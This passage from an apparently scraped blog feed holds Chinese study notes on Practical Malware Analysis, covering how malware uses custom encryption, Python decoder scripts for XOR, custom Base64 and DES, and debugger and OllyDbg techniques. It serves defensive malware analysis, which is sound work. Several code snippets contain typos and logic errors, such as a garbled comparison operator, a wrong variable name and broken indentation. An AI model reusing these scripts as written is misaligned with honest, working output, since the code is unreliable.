id="13x4-自定义加密"><a href="#13x4-自定义加密" class="headerlink" title="13x4 自定义加密"></a>13x4 自定义加密</h2><p>恶意代码常使用自创的加密方案，一种方案是将多个简单加密方法组装到一起。例如，恶意代码可以先执行一次XOR加密，然后在XOR加密基础上执行Base64加密。另外一种方案就是开发一种与标准加密算法相似的自定义加密算法。</p><h3 id="1-识别自定义加密"><a href="#1-识别自定义加密" class="headerlink" title="1. 识别自定义加密"></a>1. 识别自定义加密</h3><p>发现加密算法的艰难历程是从可疑的输入或者输出开始跟踪运行的线程。输入和输出是一个通用分类，无论恶意代码是发送网络数据包，写入文件或者写入标准输出，这都是输出。如果怀疑输出中包含加密数据，那么加密函数应该出现在输出之前。</p><p>相反，解密则出现在输入之后。例如，假设你确认了一个输入函数，则你首先应该识别出跟输入有关的数据元素，然后向后跟踪执行路径，找到访问相关数据元素的新函数。如果你到达一个函数的末尾，你应该在调用函数发生的地方继续，并且再次注意数据的位置。多数情况下，加密函数离输入函数不远。除了反向跟踪执行路径外，输出函数也是类似的。</p><h3 id="2-攻击者使用自定义加密的优势"><a href="#2-攻击者使用自定义加密的优势" class="headerlink" title="2. 攻击者使用自定义加密的优势"></a>2. 攻击者使用自定义加密的优势</h3><p>对于攻击者，自定义加密方法拥有它自身的优势，主要是因为它们保留了简单加密策略的特点（体积小和加密不明显），同时使逆向工作变得十分困难。逆向这种类型的加密（也就是识别加密过程并且开发解密器）比标准加密方法是否更加困难存在一些争议。</p><p>对于多种标准加密来说，如果识别了加密算法并且发现了密钥，则很容易使用标准的函数库来编写解密器。对于自定义加密，攻击者可以根据自己的需要创建任意的加密方案，它们可能使用也可能不使用一个明显的密钥。正如前面的例子中介绍的，密钥嵌入到代码中，甚至攻击者使用了一个密钥并且被我们发现，但是，不可能存在一个免费的函数库供我们实现解密。</p><h2 id="13x5-解密"><a href="#13x5-解密" class="headerlink" title="13x5 解密"></a>13x5 解密</h2><p>重现恶意代码中的加密或解密函数的两种基本方法</p><ol><li>重新编写函数</li><li>使用恶意代码中存在的函数</li></ol><h3 id="1-自解密"><a href="#1-自解密" class="headerlink" title="1. 自解密"></a>1. 自解密</h3><p>最经济的解密方法是:无论算法是否已知,让程序正常活动期间自己完成解密。我们称这种方法为自解密。如果你在调试器中暂停了恶意程序,并且注意到内存中的一个字符串,在你运行字符函数时你没有看到它,那么你已经使用自解密技术。无论先前被隐藏的信息在何处被解密,中断解密过程并做进一步分析,比尝试着确定使用了何种加密机制和尝试构造解密器更加容易虽然自解密是一种廉价且有效的解密方式,但是它也有缺点。首先,为了确认执行的每一个解密实例,你都必须要分离解密函数,并且在解密例程之后直接设置断点。更重要的是,如果恶意代码没有解密你感兴趣的信息(或你不知道如何欺骗恶意代码让其这么做),那你就会很倒霉。由于这些原因,使用这种技术的关键是提供更多控制。</p><h3 id="2-手动执行解密函数"><a href="#2-手动执行解密函数" class="headerlink" title="2. 手动执行解密函数"></a>2. 手动执行解密函数</h3><p>对于简单的加密和编码方法，通常你可以使用编程语言提供的标准函数。</p><p>对于缺少标准解密函数的简单加密方法，如XOR加密或使用修改字母表的的Base64加密，最简单的方法是使用你选择语言中的程序或脚本的加密函数。</p><p><strong>Base64脚本</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">example_string&#x3D;&#39; VChpcyBpcyBhIHR1c3Qgc3RyawSn&#39;</span><br><span class="line">print base64. decodestring(example_string)</span><br></pre></td></tr></table></figure></div><p><strong>保留NULL字节的XOR加密算法的Python脚本</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def null_preserving_xor(input_char,key_char):</span><br><span class="line">    if(input_char s&#x3D; key_char or input_char &#x3D;&#x3D; chr(0x00)): </span><br><span class="line">        return input_char </span><br><span class="line">else: </span><br><span class="line">        return chr(ord(input_char)^ord(key_char))</span><br></pre></td></tr></table></figure></div><p>这个函数需要两个字符：一个输入字符，一个密钥字符，并且输出一个转换后的字符。为了使用保留NULL的单字节XOR加密算法来转换一个字符串或者一个更长的内容，将它们的每一个输入字符和一个相同密钥一起传给这个子例程（函数）。</p><p><strong>自定义Base64编码的脚本</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s &#x3D; &quot;&quot;</span><br><span class="line">custom&#x3D;&quot;9ZABCDEFGHIJKLMNOPQRSTUVWXYabcdefghijklmnopqrstuvwxyz012345678+&#x2F;&quot;</span><br><span class="line">Base64&#x3D;&quot;ABCDEFCHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">ciphertext&#x3D;&#39;TEgobxZobxZgCFPkb20&#39;</span><br><span class="line"></span><br><span class="line">for ch in ciphertext: </span><br><span class="line">    if(ch in Base64): </span><br><span class="line">    s &#x3D; s + Base64[string.find(custom, str(ch))]</span><br><span class="line">    elif(ch &#x3D;&#x3D; &#39;&#x3D;&#39;):</span><br><span class="line">        s +&#x3D; &#39;&#x3D;&#39;</span><br><span class="line">result &#x3D; base64.decodestring(s)</span><br></pre></td></tr></table></figure></div><p>对于标准的加密算法，最好是使用代码库中提供的现有实现。一个基于Python的加密库叫做PyCrypto（hup://<a href="http://www.dlitz.net/software/pycrypto/" target="_blank" rel="noopener">www.dlitz.net/software/pycrypto/</a> ），它提供了各种各样的加密函数。类似的库也存在于其他不同的语言中</p><p><strong>DES脚本</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import DES </span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">obj &#x3D; DES.new(&quot;password&quot;, DES. MODE_ECB)</span><br><span class="line">cfile&#x3D;open(&#39;encrypted_file&#39;,&#39;r&#39;)</span><br><span class="line">cbuf&#x3D;f.read()</span><br><span class="line">print obj.decrypt(cbuf)</span><br></pre></td></tr></table></figure></div><p>利用导入的PyCrypto库，脚本打开一个名为encrypted_file的加密文件，并且使用密码pas sword，用电子密码本（ECB）模式进行了DES破解。</p><p>分组加密与DES加密类似，它使用不同的加密模式将一个单密钥应用到任意长度的明文流中，并且在库调用时指定模式。最简单的模式是ECB，它将分组密码应用到每个单独的明文块上。</p><p>脚本加密算法有多种可用的变种。前面的例子为编写自己的解密器提供了一个有效的选项类型。</p><p>攻击者编写自己版本的加密算法，通常要保留加密算法的简单性与良好的定义（以标准加密算法为例）。在处理非常复杂而且不标准的加密算法时，由于很难模拟算法，因此会成为更艰巨的挑战。</p><h3 id="3-使用通用的解密规范"><a href="#3-使用通用的解密规范" class="headerlink" title="3. 使用通用的解密规范"></a>3. 使用通用的解密规范</h3><p>在自解密中，试图让恶意代码自己解密时，你应该让恶意代码以正常方式运行，并且让其在合适的时间停止。但是，当你能够控制它的时候便没有了让其按照正常方式运行的理由。</p><p>一旦分离了加密或者解密例程，并且知道了它们的参数，则完全有可能使用规范让恶意代码解密任意内容，因此应该有效利用恶意代码本身来对付恶意代码。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第13章-数据加密&quot;&gt;&lt;a href=&quot;#第13章-数据加密&quot; class=&quot;headerlink&quot; title=&quot;第13章  数据加密&quot;&gt;&lt;/a&gt;第13章  数据加密&lt;/h1&gt;&lt;h2 id=&quot;13x1-分析加密算法的目的&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第8章 动态调试</title>
    <link href="https://kabeor.github.io/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>https://kabeor.github.io/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:24:50.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第8章-动态调试"><a href="#第8章-动态调试" class="headerlink" title="第8章 动态调试"></a>第8章 动态调试</h1><h2 id="8x1-源代码级与汇编级的调试器"><a href="#8x1-源代码级与汇编级的调试器" class="headerlink" title="8x1 源代码级与汇编级的调试器"></a>8x1 源代码级与汇编级的调试器</h2><h2 id="8x2-内核模式与用户模式调试"><a href="#8x2-内核模式与用户模式调试" class="headerlink" title="8x2 内核模式与用户模式调试"></a>8x2 内核模式与用户模式调试</h2><p>在用户模式中，调试器与被调试的代码运行在同一个系统中<br>内核模式调试一般需要两个不同的系统<br>WinDbg是当前唯一支持内核调试的流行调试器</p><h2 id="8x3-使用调试器"><a href="#8x3-使用调试器" class="headerlink" title="8x3 使用调试器"></a>8x3 使用调试器</h2><h3 id="1-单步调试"><a href="#1-单步调试" class="headerlink" title="1. 单步调试"></a>1. 单步调试</h3><h3 id="2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into"><a href="#2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into" class="headerlink" title="2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)"></a>2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)</h3><blockquote><p>现在是使用VMware record/replay功能的最佳时机。当你单步跳过一个不会返回的函教时，可以通过重放调试会话来纠正你的错误。开始调试时就启动记录。然后，当单步跳过一个不会返回的函数时，停止记录。重放到单步跳过的函数前面，然后停止重放，取得控制权,但这次单步跳入该函数。</p></blockquote><h3 id="3-用断点暂停执行"><a href="#3-用断点暂停执行" class="headerlink" title="3. 用断点暂停执行"></a>3. 用断点暂停执行</h3><blockquote><p>软件执行断点</p></blockquote><p>调试器通过使用0XCC,即指令INT 3的机器码，重写指令的首个字节来实现软件断点，0XCC被设计来供调试器使用。当0XCC指令执行后，操作系统会产生一个异常，然后控制权转到调试器。</p><blockquote><p>硬件执行断点</p></blockquote><p>利用专门的硬件寄存器，x86结构可以支持硬件执行断点。处理器每次执行一个指令时，硬件都会检测指令的指针是否与断点地址相等。硬断点并不关心断点地址存储哪些字节。当调试修改自身的代码时，硬断点会非常有益。硬断点相比于软断点的另一个优点是，它们可以设置访问中断的断点而不是执行中断的断点。</p><p>硬件执行断点有个明显缺点：只有四个硬件寄存器存储断点的地址。<br>硬断点的深层缺陷之一是它们容易被运行的程序修改。虽然CPU芯片有八个调试寄存器，但只有六个在使用。前四个寄存器DR0〜DR3用来存储断点地址，调试控制寄存器（DR7)存储DR0〜DR3寄存器中的值是否有效，以及它们是否表示读、写或者执行断点等信息。恶意代码可以修改这些寄存器来干扰调试器。x86芯片组具有防御该干扰的功能。通过设置DR7寄存器中的通用探测（General Detect)标志位，任何执行mov指令访问调试寄存器的操作都会触发中断。而这让你能够探测调试寄存器的改变。</p><blockquote><p>条件断点</p></blockquote><p>条件断点是软件断点的一种，它在某些条件满足时才会被触发。条件断点通过调试器总是接收的软断点来实现的。调试器计算条件，如果条件不满足，它自动继续执行而不通知用户。另外，不同的调试器支持不同的条件。</p><h2 id="8x4-异常"><a href="#8x4-异常" class="headerlink" title="8x4 异常"></a>8x4 异常</h2><p>异常是调试器取得运行程序控制权的基本方式。本质上，除了断点产生异常外，与调试无关的事件，如非法内存访问、除0操作也会产生异常</p><h3 id="1-首次和二次异常处理"><a href="#1-首次和二次异常处理" class="headerlink" title="1. 首次和二次异常处理"></a>1. 首次和二次异常处理</h3><p>调试器通常有两次机会来处理同一个异常：首次处理异常和二次处理异常。调试器第一次附加到进程时，会发生一个异常，然后被调试的程序停止执行，此时调试器开始获得控制权。调试器可以自己处理异常，也可以将异常转给被调试的应用程序处理。</p><p>如果程序注册了一个异常处理函数，它会在调试器处理异常后，获得处理异常的权限。<br>如果应用程序没有处理异常，调试器将获得另一个处理它的机会—— 二次异常处理。调试器接收到一个二次处理的异常后，意味着如果程序没有附加到调试器就会崩溃。为了让应用程序正常运行，调试器必须处理异常。</p><h3 id="2-常见异常"><a href="#2-常见异常" class="headerlink" title="2. 常见异常"></a>2. 常见异常</h3><blockquote><p>最常见的是执行INT 3指令时产生的异常。调试器有专门的代码处理INT 3<br>异常，而操作系统则把它和其他异常一样对待。<br>应用程序可能包含处理INT 3异常的指令，但附加调试器到程序后，调试器将获得首先处理异常权限。如果调试器将异常传给程序，程序的异常处理函数会处理它。</p></blockquote><blockquote><p>单步调试也作为操作系统内的一个异常来实现。标志寄存器中的陷阱标志（trap flag)用于单步 调试。陷阱标志置位后，处理器每执行一条指令就会产生异常。</p></blockquote><blockquote><p>当程序试图去访问一个它无权访问的内存位置时，将产生内存访问冲突（memory-access violation)异常。这种异常经常因为内存地址无效而发生，也可能是因为访问了受保护而无权访问的内存位置。</p></blockquote><blockquote><p>另外，一些指令只在处理器处于特权模式时才能执行。如果程序尝试着在非特权模式下执行它们，则处理器会产生异常。</p></blockquote><h2 id="8x5-使用调试器修改可执行文件"><a href="#8x5-使用调试器修改可执行文件" class="headerlink" title="8x5 使用调试器修改可执行文件"></a>8x5 使用调试器修改可执行文件</h2><p>调试器可以用来改变程序的执行方式。可以通过修改控制标志、指令指针或者代码本身等方式来改变程序执行的方式。</p><h2 id="8x6-修改可执行程序的实践"><a href="#8x6-修改可执行程序的实践" class="headerlink" title="8x6 修改可执行程序的实践"></a>8x6 修改可执行程序的实践</h2><p>End..</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第8章-动态调试&quot;&gt;&lt;a href=&quot;#第8章-动态调试&quot; class=&quot;headerlink&quot; title=&quot;第8章 动态调试&quot;&gt;&lt;/a&gt;第8章 动态调试&lt;/h1&gt;&lt;h2 id=&quot;8x1-源代码级与汇编级的调试器&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第三篇 动态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%89%E7%AF%87-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第9章 OllyDbg</title>
    <link href="https://kabeor.github.io/%E7%AC%AC9%E7%AB%A0%20OllyDbg/"/>
    <id>https://kabeor.github.io/%E7%AC%AC9%E7%AB%A0%20OllyDbg/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:25:02.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h1><p>OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security公司买下 OllyDbg1.1的基础代码,并将其更名为Immunity Debugger(ImmDbg)。在此之前, OllyDbg直都是恶意代码分析师和漏洞开发者们的首选调试器。Immunity的目的是使这个工具适合漏洞开发者们使用,并且修复了OllDbg中的一些Bug。<br>在完成 OllyDbg的外观GUI修改,提供带有完整功能的 Python解释器API后,一些用户开始用ImmDbg替代OllyDbg</p><h2 id="9x1-加载恶意代码"><a href="#9x1-加载恶意代码" class="headerlink" title="9x1 加载恶意代码"></a>9x1 加载恶意代码</h2><h3 id="1-打开一个可执行文件"><a href="#1-打开一个可执行文件" class="headerlink" title="1. 打开一个可执行文件"></a>1. 打开一个可执行文件</h3><p>选择OllyDbg界面中的File-&gt;Open, 然后浏览到要加载的可执行文件。<br>如果要调试的程序需要参数,则在Open对话框的 Arguments输入框给出(只能在加载期间给OllyDgb传入命令行参数)</p><p>默认情况下,如果能够确定软件的入口点位置,即 WinMain, OllyDbg会在这个位置暂停程序的执行。否则OllyDbg会在软件PE头部提供的入口点处中断。另外,你也可以选择 OllyDbg的DebuggingOptions菜单(Options→Debugging Options)来修改这些启动选项。</p><h3 id="2-附加调试器到一个运行程序"><a href="#2-附加调试器到一个运行程序" class="headerlink" title="2. 附加调试器到一个运行程序"></a>2. 附加调试器到一个运行程序</h3><p>为将OllyDbg附加到一个进程上,选择OllyDbg界面的File→ Attach。然后会弹出一个菜单,你可以在这个菜单中选择要附加的进程(如果有多个同名的进程,你需要知道调试进程的ID)。接下来选择要调试的进程,并从菜单中选择Attach。此刻OllyDbg会立即暂停这个程序以及它所有的线程。</p><p>OllyDbg附加上进程后,进程当前执行线程的代码会被暂停,并显示在OllyDbg的窗口中。然而，有可能在进程正在执行一个系统DLL中的指令时把它暂停了,当这种情况发生时,回到主代码最简单的办法就是在整个代码段中设置一个访问断点。这样就会让这个程序在下次访问代码段时中断执行。</p><h2 id="9x2-OllyDbg的接口"><a href="#9x2-OllyDbg的接口" class="headerlink" title="9x2 OllyDbg的接口"></a>9x2 OllyDbg的接口</h2><blockquote><p> <strong>反汇编面板窗口</strong><br> 这个窗口显示了被调试程序的代码一当前指令指针的前后一些指令。通常，下一条将要被执行的指令在这个窗口中高亮显示。如果想要修改指令或数据(或添加一些汇编指令),请在这个窗口中按空格键。</p></blockquote><blockquote><p><strong>寄存器面板窗口</strong><br>这个窗口用来显示被调试程序寄存器的当前状态，代码被调试时，如果一条指令运行过程中修改了寄存器的值，则寄存器窗口中的这个寄存器就会从黑色变为红色。</p></blockquote><blockquote><p><strong>栈面板窗口</strong><br>这个窗口用来显示被调试线程堆栈在内存中的当前状态。这个窗口总是显示给定线程的栈项。可以通过右击一个栈单元，选择Modify，来操作这个窗口中的栈。OllyDbg会在一些栈单元上显示一些有用的注释，这些注释描述了调用一个API之前栈中存放的参数。</p></blockquote><blockquote><p><strong>内存转储面板窗口</strong><br>这个窗口用来显示被调试进程的实时内存转储。在这个窗口中按CtrI+G组合键，并输入一个内存位置，可以跳转到任何内存地址（也可以单击一个内存地址，然后选择Follow in Dump，来转储那个内存地址）。如果想要编辑这个窗口中的内存，右击它并选择Binary-&gt;Edit。使用这种方式也可以修改恶意代码存储在RAM中的全局变量以及其他一些数据。</p></blockquote><h2 id="9x3-内存映射"><a href="#9x3-内存映射" class="headerlink" title="9x3 内存映射"></a>9x3 内存映射</h2><p>内存映射窗口( View-&gt;Memory)显示了被调试程序分配的所有内存块。<br>内存映射是查看程序在内存中布局的一个好方式。你可以双击内存映射中的任意一行，显示那个段的内存转储。你也可以通过右击一段内存转储，然后选择View in Disassembler的方式，将其中的数据发送到反汇编窗口。</p><h3 id="1-基地址重定位"><a href="#1-基地址重定位" class="headerlink" title="1. 基地址重定位"></a>1. 基地址重定位</h3><p>内存映射能够帮助你理解一个PE文件在运行时如何被重定位。基地址重定位是指Windows中的一个模块没有被加载到其预定基地址时发生的情况。</p><blockquote><p><strong>基地址</strong><br>   Windows中的所有PE文件都有一个预定的基地址，它在PE文件头中被称为映像基地址。</p><p>  Windows允许映像基地址与要被加载到内存的实际地址不一致，虽然大部分情况下是一致的。大部分执行程序都被预定加载到0x00400000处，这个地址是Windows平台下大多数编译器使用的默认地址。不过，开发者可以选择将执行程序的基地址设置为一个与此不同的地址。支持地址空间布局随机化( ASLR)安全增强特性的可执行程序会经常被重定位。这就是说.DLL的重定位变得更加普遍。<br>    因为一个应用程序可能导入许多DLL，而每个DLL都有一个希望被加载到内存中的预定基地址，所以重定位十分必要。假设有两个DLL被加载，并且它们拥有相同的预加载地址0x10000000，则它们不可能都加载到这个位置,Windows会将其中一个DLL加载到这个地址，另一个DLL重定位到另外某个地址。<br>    Windows操作系统自带的大多数DLL有不同的预定基地址，而且它们之间不会产生冲突。然而第三方应用程序会经常出现使用同一个预定基地址的情况。</p></blockquote><blockquote><p><strong>绝对地址与相对地址</strong><br>重定位过程比简单将代码加载到另一个位置要复杂得多。虽然多数指令会引用内存中的相对地址，但是有些却引用内存的绝对地址。</p></blockquote><h2 id="9x4-查看线程和堆栈"><a href="#9x4-查看线程和堆栈" class="headerlink" title="9x4 查看线程和堆栈"></a>9x4 查看线程和堆栈</h2><p>恶意代码经常使用多线程。你可以通过选择View-&gt;Threads，调出线程面板窗口，查看一个程序的当前线程。这个窗口显示了线程的内存位置，以及它们当前的活动状态（活动、暂停，或者挂起）。<br>    由OllyDbg是单线程的，可能需要你先暂停所有的线程，设置一个断点后，继续运行程序，这样可以确保在一个特定线程内调试。单击主工具栏中的暂停按钮，可以暂停所有活动的线程。</p><h2 id="9x5-执行代码"><a href="#9x5-执行代码" class="headerlink" title="9x5 执行代码"></a>9x5 执行代码</h2><p><a href="https://i.loli.net/2018/07/20/5b519235da3c2.jpg" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/20/5b519235da3c2.jpg" class="lazyload"></a></p><h2 id="9x6-断点"><a href="#9x6-断点" class="headerlink" title="9x6 断点"></a>9x6 断点</h2><p><a href="https://i.loli.net/2018/07/20/5b5192c91c650.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/20/5b5192c91c650.jpg" class="lazyload"></a></p><h3 id="1-软件断点"><a href="#1-软件断点" class="headerlink" title="1. 软件断点"></a>1. 软件断点</h3><p>调试字符串解码函数时，软件断点特别有用。</p><h3 id="2-条件断点"><a href="#2-条件断点" class="headerlink" title="2. 条件断点"></a>2. 条件断点</h3><p>条件断点是软件断点的一种，只有某些条件得到满足时这个断点才能中断执行程序。OllyDbg调试器允许使用表达式，来设置断点，每当断点命中时，都会先计算表达式的值，如果其值不等于零，断点生效，程序运行中断。</p><p>对于调用频繁的API函数，仅当特定参数传给它时才中断程序执行，这种情况下，条件软件断点特别有用。</p><blockquote><p><strong>设置条件断点的步骤</strong></p></blockquote><ol><li>右击反汇编面板窗口中函数的第一条指令，选择Breakpoint-&gt;Conditional。然后会弹出一个对话框，要求你输入条件表达式.</li><li>在步骤l弹出的对话框中输入表达式，然后单击OK按钮。</li><li>单击Play按钮，并等待条件断点命中。</li></ol><h3 id="3-硬件断点"><a href="#3-硬件断点" class="headerlink" title="3. 硬件断点"></a>3. 硬件断点</h3><p>硬件断点非常强大，它可以在不改变你的代码、堆栈以及任何目标资源的前提下进行调试。</p><p>OllyDbg中，在某一指令上设置硬件断点的方法是：右击该指令选择Breakpoint-&gt;Hardware，on Execution。</p><p>通过使用Debugging Options菜单，你可以告诉OllyDbg默认使用硬件断点来代替软件断点。同时，使用硬件断点可以帮助你防御反调试技术，如软件断点扫描。</p><h3 id="4-内存断点"><a href="#4-内存断点" class="headerlink" title="4. 内存断点"></a>4. 内存断点</h3><p>在一个内存块上设置内存断点，可以让被调试程序在访问这段内存时中断执行。OllyDbg支持软件内存断虑和硬件内存断点，此外还支持对内存进行读、写、执行或其他权限访问是否产生中断的设置。</p><p>为了设置一个基本的内存断点，在内存转储面板窗口中选择一部分内存，或者在内存映射面板窗口中选择一个内存段，然后右击它，选择Breakpoint-&gt;Memory,on Access。OllyDbg只允许你一次设置一个内存断点。如果你设置了一个新的内存断点，那么之前设置的内存断点会被移除。</p><p>在分析恶意代码时，如果想知道恶意代码何时使用了某个加载的DLL，这时内存断点将变得特别有用。可以设置这样一个内存断点，当DLL中的代码运行时程序被中断。下面是实现这种功能的步骤：</p><blockquote><p>1．打开内存映射面板窗门，并右i键单击需要跟踪DLL的.text段（.text段包含DLL的可执行代码）。<br>2．选择Set Memory Breakpoint on Access.<br>3．按F9键或者单击Play按钮恢复程序运行。<br>    当心用程序运行到DLL的．text段代码时．会中断执行。</p></blockquote><h2 id="9x7-加载DLL"><a href="#9x7-加载DLL" class="headerlink" title="9x7 加载DLL"></a>9x7 加载DLL</h2><p>除了可以调试加载的或者附加的可执行程序，OllyDbg还可以调试DLL。然而由于DLL不能直接运行．OllyDbg使用了一个名为loaddll. exe的虚拟程序来加载它。由于恶意代码经常打包成DLL．且其大部分代码都包含在DLL的DlIMain函数（DLL的初始化函数，当DLL被加载到进程时被调用）中，因此OllyDbg的这种技术非常有用。默认情况下，一旦DLL被加载，OllyDbg会在DLL的入口点(DllMain)处中断。</p><p>如果要用参数调用被调试DLL中的导出函数，首先用OllyDbg加载DLL．然后在其入口点处暂停DLL的执行，最后单击Play按钮，运行DllMain函数，以及其他一些DLL要求的初始化操作。</p><h2 id="9x8-跟踪"><a href="#9x8-跟踪" class="headerlink" title="9x8 跟踪"></a>9x8 跟踪</h2><p>跟踪是一种强大的调试技术，它可以记录程序详细的运行信息，供你查阅。OllyDbg支持多种跟踪功能，包括：标准回溯跟踪、堆栈调用跟踪和运行跟踪等。</p><h3 id="1-标准回溯跟踪"><a href="#1-标准回溯跟踪" class="headerlink" title="1. 标准回溯跟踪"></a>1. 标准回溯跟踪</h3><p>每次你在反汇编面板窗口上执行Step Into和Step Over操作时，OllyDbg都会记录下这种动作。你可以使用键盘上的减号键（一）。退回到上一步运行的指令：使用加号键(+)．执行下一条指令。<br>如果使用Step Into，你可以跟踪每一步的执行。如果使用Step Over，只能单步跟踪step over之前区域，回溯之后再决定是否进入另一个区域。</p><h3 id="2-堆栈调用跟踪"><a href="#2-堆栈调用跟踪" class="headerlink" title="2. 堆栈调用跟踪"></a>2. 堆栈调用跟踪</h3><p>在OllyDbg中，通过堆栈跟踪可以查看一个给定函数的执行路径。为了查看堆栈调用，在主菜单中选择View-&gt;Call Stack．会弹出一个窗口，窗口中显示了当前位置之前的调用序列。<br>    为了跟踪堆栈调用，单击地址或者堆栈调用窗口中的某段。当你在那个堆栈位置时，寄存器和堆栈并不会显示什么，除非你执行运行跟踪操作。</p><h3 id="3-运行跟踪"><a href="#3-运行跟踪" class="headerlink" title="3. 运行跟踪"></a>3. 运行跟踪</h3><p>运行跟踪是指在运行代码时，OllyDbg会保存所有运行过的指令，以及它们运行过程中对寄存器和标志所做的改变。</p><blockquote><p><strong>几种激活运行跟踪的方法</strong><br>·  在反汇编面板窗口中高亮你要跟踪的代码。右键单击代码，选择Run Trace–Add Selection。代码运行后，选择View-&gt;Run Trace，查看运行过的指令。使用键盘上的一（减号键）和+（加号键），来上下浏览代码（与标准回溯跟踪小节讨论的一样）。使用这种方法，可以查看每条指令执行时所有寄存器发生的变化。<br>    ·  使用Trace Into与Trace Ovcr选项。这些选项比Add Selection更容易使用，因为它们不需要你选择需要跟踪的代码。Trace Into可以单步执行并且记录命中断点前所有的运行指令，但Trace Over仅记录当前正在运行函数的指令。<br>·  选择Select Debug-&gt;Set Condition。可以在命中条件使程序暂停之前，跟踪程序的运行。如果你想在条件断点命中时停止跟踪，并且从发生中断的位置，回溯跟踪查看如何或者为什么发生中断，这种跟踪方法将对你非常有帮助。</p></blockquote><h3 id="4-跟踪Poison-lvy"><a href="#4-跟踪Poison-lvy" class="headerlink" title="4. 跟踪Poison lvy"></a>4. 跟踪Poison lvy</h3><h2 id="9x9-异常处理"><a href="#9x9-异常处理" class="headerlink" title="9x9 异常处理"></a>9x9 异常处理</h2><p>默认情况下．OllyDbg被附加后会产生异常，附加程序也会停止运行，此时调试器开始接管控制权。调试器可以处理该异常，也可以将异常转到被调试的应用程序处理。当异常发生时．OllyDbg会暂停运行，然后你可以使用下列任一种方法，来决定是否将异常转到应用程序处理：</p><blockquote><p>·  Shift+F7将进入异常。<br>·  Shift+F8将跳过异常。<br>·  